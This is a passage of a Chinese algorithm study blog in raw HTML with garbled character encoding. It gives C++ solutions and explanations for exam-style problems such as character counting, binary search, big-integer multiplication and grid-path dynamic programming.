href="#å­—ç¬¦ç»Ÿè®¡" class="headerlink" title="å­—ç¬¦ç»Ÿè®¡"></a>å­—ç¬¦ç»Ÿè®¡</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305162019359.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305162019359.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ«çœ‹ä»£ç å°‘ï¼Œå¾ˆå¤šçŸ¥è¯†ç›²åŒº</p><blockquote><p>é¦–å…ˆcinä¸èƒ½è¯»å–æ¢è¡Œç¬¦ï¼Œå¦‚æœéè¦ä½¿ç”¨cinï¼Œè¦ç”¨<code>char a;while(cin&gt;&gt;noskipws&gt;&gt;a;&amp;&amp;a!=&#39;.&#39;);</code>ï¼Œä¸æ¨èï¼Œè€ƒè¯•ä¹Ÿè®°ä¸èµ·æ¥</p><ul><li>getline(cin,str,â€™.â€™);ä»¥.ä¸ºåˆ†éš”ç¬¦è¯»å–å­—ç¬¦ï¼Œå‰é¢çš„ç©ºæ ¼å’Œæ¢è¡Œç¬¦ä¹Ÿéƒ½è¦è¯»å–ï¼Œé»˜è®¤getline(cin,str)ä¼šè¯»ç©ºæ ¼</li><li>getchar()è¯»ä¸€ä¸ªå­—ç¬¦ã€‚</li></ul><p>æ˜“é”™ç‚¹ï¼šå­—ç¬¦æ¯”è¾ƒæ—¶ï¼Œâ€™\nâ€™å’Œâ€™.â€™å¿…é¡»ç”¨å•å¼•å·ï¼ŒåŒå¼•å·ä¼šå­—ç¬¦ä¸²æœ«å°¾+â€™\0â€™ï¼Œå­—ç¬¦å’Œå­—ç¬¦ä¸²æ¯”è¾ƒä¼šè½¬ä¸ºæ•´å‹æ¯”è¾ƒå¹¶æŠ¥é”™</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å­—ç¬¦ç»Ÿè®¡</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string strs;</span><br><span class="line"><span class="type">int</span> skipnum=<span class="number">0</span>,atsum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">getline</span>(cin,strs,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="comment">//cout&lt;&lt;strs;</span></span><br><span class="line"><span class="type">int</span> n=strs.<span class="built_in">length</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="type">char</span> str=strs[i];</span><br><span class="line"><span class="keyword">if</span>(str==<span class="string">&#x27;\n&#x27;</span>) skipnum++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(strs[i+<span class="number">1</span>]==<span class="string">&#x27;t&#x27;</span>) atsum++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;skipnum&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;atsum;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305163007582.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305163007582.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="çŒœæ•°å­—"><a href="#çŒœæ•°å­—" class="headerlink" title="çŒœæ•°å­—"></a>çŒœæ•°å­—</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170001031.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170001031.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŠ˜åŠæŸ¥æ‰¾</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//çŒœæ•°å­—</span></span><br><span class="line"><span class="comment">//æŠ˜åŠæŸ¥æ‰¾ï¼Œç‹é“ä¸Šæœ‰ </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">halfseek</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> mid=n/<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> seeknum=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> low=<span class="number">0</span>,high=n;</span><br><span class="line"><span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">seeknum++;</span><br><span class="line"><span class="keyword">if</span>(mid==x) <span class="keyword">return</span> seeknum<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(x&gt;mid)&#123;</span><br><span class="line">low=mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">high=mid<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,x;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">cout&lt;&lt;<span class="built_in">halfseek</span>(n,x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170045851.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170045851.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="çŸ©å½¢å®¹çº³"><a href="#çŸ©å½¢å®¹çº³" class="headerlink" title="çŸ©å½¢å®¹çº³"></a>çŸ©å½¢å®¹çº³</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306113921669.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306113921669.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>n&#x2F;2*m&#x2F;2</p><h3 id="çŸ©é˜µè¦†ç›–"><a href="#çŸ©é˜µè¦†ç›–" class="headerlink" title="çŸ©é˜µè¦†ç›–"></a>çŸ©é˜µè¦†ç›–</h3><p>è¾“å‡ºæ ¼å¼é‚£æ‰“é”™äº†ï¼Œåº”è¯¥æ˜¯è¦è¦†ç›–éœ€è¦çš„æ­£æ–¹å½¢ä¸ªæ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135053348.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135053348.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>nä¸ºå¥‡æ•°åˆ™n&#x2F;2+1ï¼Œnä¸ºå¶æ•°åˆ™n&#x2F;2ã€‚</p><h3 id="çŸ©é˜µè¦†ç›–2"><a href="#çŸ©é˜µè¦†ç›–2" class="headerlink" title="çŸ©é˜µè¦†ç›–2"></a>çŸ©é˜µè¦†ç›–2</h3><p><code>æˆ‘ä»¬å¯ä»¥ç”¨2*1çš„å°çŸ©å½¢æ¨ªç€æˆ–è€…ç«–ç€å»è¦†ç›–æ›´å¤§çš„çŸ©å½¢ã€‚è¯·é—®ç”¨nä¸ª2*1çš„å°çŸ©å½¢æ— é‡å åœ°è¦†ç›–ä¸€ä¸ª2*nçš„å¤§çŸ©å½¢ï¼Œæ€»å…±æœ‰å¤šå°‘ç§æ–¹æ³•ï¼Ÿ</code></p><p>æ ¹æ®ä¸¤ä¸ªçŸ©å½¢çš„å½¢çŠ¶å¯çŸ¥ï¼Œå½“ç¬¬ä¸€æ¬¡ç«–ç€æ”¾çš„æ—¶å€™ï¼Œä¸€å…±æœ‰å¤šå°‘æ–¹æ³•å–å†³äºåé¢è¾¹é•¿ä¸º2*(n-1)çš„çŸ©å½¢ä¸­å°çŸ©å½¢çš„æ”¾æ³•æœ‰å¤šå°‘ç§ï¼›å½“ç¬¬ä¸€æ¬¡æ¨ªç€æ”¾çš„æ—¶å€™ï¼Œå¿…é¡»æ˜¯æ¨ªç€æ”¾ä¸¤ä¸ªçŸ©å½¢ï¼Œä¸€å…±æœ‰å¤šå°‘ç§æ–¹æ³•å–å†³äºåé¢è¾¹é•¿ä¸º2*(n-2)çš„çŸ©å½¢ä¸­å°çŸ©å½¢çš„æ”¾æ³•æœ‰å¤šå°‘ç§ã€‚æ‰€ä»¥æ€»å…±çš„æ”¾æ³•æœ‰f(n)&#x3D;f(n-1)+f(n-2)ã€‚</p><p>f(1)&#x3D;1ï¼Œf(2)&#x3D;2</p><p>æ–æ³¢é‚£å¥‘</p><h3 id="é«˜ç²¾åº¦ä¹˜æ³•"><a href="#é«˜ç²¾åº¦ä¹˜æ³•" class="headerlink" title="é«˜ç²¾åº¦ä¹˜æ³•"></a>é«˜ç²¾åº¦ä¹˜æ³•</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135856628.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240306135856628.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€éš¾çš„ä¸€é“ï¼Œéš¾åˆ°ä½ ä¸Šç½‘æœcsdnå’ŒçŸ¥ä¹æœå‡ºæ¥çš„ç­”æ¡ˆèƒ½çœ‹åˆ°ä½ è„‘å­çˆ†ç‚¸ã€‚æœ‰ä¸‰ä¸ªéš¾ç‚¹ï¼š</p><p>æ€ä¹ˆå­˜å‚¨å¤§æ•´æ•°ï¼Ÿå¤§æ•´æ•°æ€ä¹ˆåŠ æ³•ï¼Ÿå¤§æ•´æ•°æ€ä¹ˆä¹˜æ³•ï¼Ÿ</p><p>é¦–å…ˆï¼Œå¯ä»¥ç”¨æ•°ç»„å­˜å¤§æ•´æ•°çš„æ¯ä¸€ä½ï¼Œç”¨æ•°ç»„ä¸‹æ ‡è¡¨ç¤ºå…¶ä½é«˜ã€‚å¯ä»¥å‘stringè¾“å…¥ï¼Œç„¶åå‡å»å­—ç¬¦<code>&#39;0&#39;</code>å³å¯å¾—åˆ°å…¶æ¯ä¸€ä½æ•°å­—ã€‚</p><ul><li>å¤§æ•´æ•°æ€ä¹ˆä¹˜ï¼Ÿ</li></ul><p>å¸¸è§„ä¹˜æ³•æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/4083f30387fbfbd83c45498bdfe79c84.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/4083f30387fbfbd83c45498bdfe79c84.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœ199Ã—9ï¼Œ199Ã—9ï¼Œ199Ã—1å†ç§»ä½ç›¸åŠ ï¼Œå°±è¦ç”¨ä¸‰ä¸ªvectorå­˜å‚¨ä¸­é—´ç»“æœï¼Œéº»çƒ¦ä¸”ç©ºé—´å¤æ‚åº¦é«˜</p><p>å®é™…ä¸Š199Ã—9ä¹Ÿæ˜¯9Ã—9,9Ã—9,1Ã—9çš„ç§»ä½åŠ ï¼Œä¸”å„ä½ä¹˜ä¸ªä½å¿…å®šä½æ•°åœ¨2ä»¥å†…ã€‚</p><p><code>A[i]Ã—B[j]+ä¸Šä¸€è½®çš„è¿›ä½</code>å°±æ˜¯æœ¬è½®ç»“æœã€‚ä¸ªä½æ•°ä¸ºC[i+j+1]ï¼Œåä½æ•°ä¸º<code>C[i+j]+ä¹‹å‰çš„è¿›ä½</code>ã€‚</p><p>å¯èƒ½è¿˜æ˜¯ä¸èƒ½ç†è§£ï¼Œæ¨¡æ‹Ÿä¸€ä¸‹å¾ªç¯ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/QQ%E5%9B%BE%E7%89%8720240307171933.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/QQ%E5%9B%BE%E7%89%8720240307171933.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>é‡ç‚¹ï¼šstring A&#x3D;123456789ï¼ŒA[8]&#x3D;9ï¼ŒåŠ å‡ä¹˜æ˜¯ä»ä¸ªä½å¼€å§‹çš„ï¼Œæ‰€ä»¥åº”è¯¥é€†åº</p><p>ç»“æœä¹Ÿæ˜¯ä¸€æ ·ï¼Œæ¯”å¦‚9Ã—9&#x3D;81ï¼Œ8åº”è¯¥å­˜C[0]ï¼Œ1å­˜C[1]ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é«˜ç²¾åº¦ä¹˜æ³• </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">pricisemultipy</span><span class="params">(string &amp;A,string &amp;B)</span></span>&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">C</span><span class="params">(A.size()+B.size(),<span class="number">0</span>)</span></span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=A.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=B.<span class="built_in">size</span>()<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="type">int</span> sum = (A[i]-<span class="string">&#x27;0&#x27;</span>)*(B[j]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="type">int</span> result = sum + C[i+j+<span class="number">1</span>];<span class="comment">//åŠ ä¸Šä¸€è½®çš„è¿›ä½</span></span><br><span class="line">C[i+j+<span class="number">1</span>] = result % <span class="number">10</span> ;<span class="comment">//ä¸ªä½ </span></span><br><span class="line">C[i+j] += result / <span class="number">10</span> ;<span class="comment">//åä½ï¼Œè¿˜è¦åŠ ä¸Šä¹‹å‰é‚£ä¸ªä½ç½®ä¸Šæœ‰çš„æ•°å­—</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string A,B;</span><br><span class="line">cin&gt;&gt;A&gt;&gt;B;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; C = <span class="built_in">pricisemultipy</span>(A,B);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;C.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">cout&lt;&lt;C[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æœ€åCæ•°ç»„ä»é«˜åˆ°ä½å°±æ˜¯ç»“æœã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172351451.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172351451.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172420494.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307172420494.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>ç®—æ³•ä¸ºäº†ç†è§£ï¼Œå»é™¤äº†ä¸å¿…è¦çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚å»é™¤é«˜ä½0å’Œè¾“å…¥0åˆ¤æ–­ã€‚</p><p>é«˜ç²¾åº¦é™¤æ³•å¤§æ¦‚ç‡ä¸è€ƒï¼Œè€ƒäº†ä¹Ÿæ²¡äººèƒ½å†™å‡ºæ¥ã€‚è¿™ä¸ªç®—æ³•è¯·åŠ¡å¿…å¤šå†™å‡ é</p></blockquote><h3 id="ç æ ‘ä¿®è·¯"><a href="#ç æ ‘ä¿®è·¯" class="headerlink" title="ç æ ‘ä¿®è·¯"></a>ç æ ‘ä¿®è·¯</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307173936207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240307173936207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”¨è¾…åŠ©æ•°ç»„Treeï¼Œè®¿é—®åˆ°ç½®ä¸º1ï¼Œæœ€åæ•°0ã€‚</p><blockquote><p>æ˜“é”™ç‚¹ï¼šä¸èƒ½int Tree[L+1];ï¼Œå˜é•¿æ•°ç»„ä¸ä¼šæŠ¥é”™ä½†è¿ç®—ä¼šå‡ºé—®é¢˜</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç æ ‘ä¿®è·¯</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">remain</span><span class="params">(<span class="type">int</span> L,<span class="type">int</span> n,vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;a)</span></span>&#123;<span class="comment">//0~Lçš„æ•°ç»„ï¼Œè®¿é—®åˆ°å°±ç½®ä¸º1ï¼Œæœ€åä¸º0çš„å°±æ˜¯å‰©ä½™æ ‘ </span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">Tree</span><span class="params">(L+<span class="number">1</span>)</span></span>;<span class="comment">//ä¸èƒ½int Tree[L+1];ï¼Œå˜é•¿æ•°ç»„ä¸ä¼šæŠ¥é”™ä½†è¿ç®—ä¼šå‡ºé—®é¢˜ </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=a[i][<span class="number">0</span>];j&lt;=a[i][<span class="number">1</span>];j++)&#123;</span><br><span class="line">Tree[j]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=L;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Tree[i]==<span class="number">0</span>) sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> L,n;</span><br><span class="line">cin&gt;&gt;L&gt;&gt;n;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">a</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; (<span class="number">2</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;a[i][<span class="number">0</span>]&gt;&gt;a[i][<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="built_in">remain</span>(L,n,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="letcode-amp-ç‰›å®¢dp-é“¾è¡¨"><a href="#letcode-amp-ç‰›å®¢dp-é“¾è¡¨" class="headerlink" title="letcode&amp;ç‰›å®¢dp+é“¾è¡¨"></a>letcode&amp;ç‰›å®¢dp+é“¾è¡¨</h2><h3 id="ä¸åŒè·¯å¾„"><a href="#ä¸åŒè·¯å¾„" class="headerlink" title="ä¸åŒè·¯å¾„"></a>ä¸åŒè·¯å¾„</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105643910.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105643910.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆçœ‹é€’å½’è§£å†³ï¼šå¾ˆæ˜æ˜¾ä»å³ä¸‹è§’å¼€å§‹æ€è€ƒï¼Œæœ‰ä»ä¸Šå’Œä»å·¦è¿‡æ¥ä¸¤ç§æ–¹å¼ï¼Œå³ç­‰äºå·¦å’Œä¸Šè·¯å¾„æ¡æ•°ä¹‹å’Œã€‚1*2ï¼Œ1*3â€¦.ç­‰å¾ˆæ˜æ˜¾åªæœ‰ä¸€æ¡è·¯å¾„ï¼Œå³m or nä¸€ä¸ªä¸º1ï¼Œåˆ™è¿”å›1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(<span class="type">int</span> m,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(m&gt;<span class="number">1</span>&amp;&amp;n&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">path</span>(m<span class="number">-1</span>,n)+<span class="built_in">path</span>(m,n<span class="number">-1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;<span class="comment">//1*2æˆ–è€…2*1æˆ–è€…1*6çš„è·¯å¾„é€‰æ‹©éƒ½ä¸º1ä¸ª </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line">cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">cout&lt;&lt;<span class="built_in">path</span>(m,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆé—æ†¾ï¼Œé€’å½’ä¸æ»¡è¶³æ—¶é—´å¤æ‚åº¦ã€‚</p><p>éé€’å½’è§£å†³ï¼šå®šä¹‰ä¸€ä¸ªdpæ•°ç»„ï¼Œè®°å½•æ¯ä¸ªæ ¼å­çš„è·¯å¾„æ¡æ•°ï¼Œå³é™¤ä¸€è¡Œä¸€åˆ—å¤–ï¼Œæ¯ä¸ªæ ¼å­çš„è·¯å¾„æ¡æ•°éƒ½ç­‰äºä¸Š+å·¦</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">path</span><span class="params">(<span class="type">int</span> m,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> dp[m][n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j&gt;<span class="number">0</span>&amp;&amp;i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        dp[i][j]=dp[i<span class="number">-1</span>][j]+dp[i][j<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line">cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">cout&lt;&lt;<span 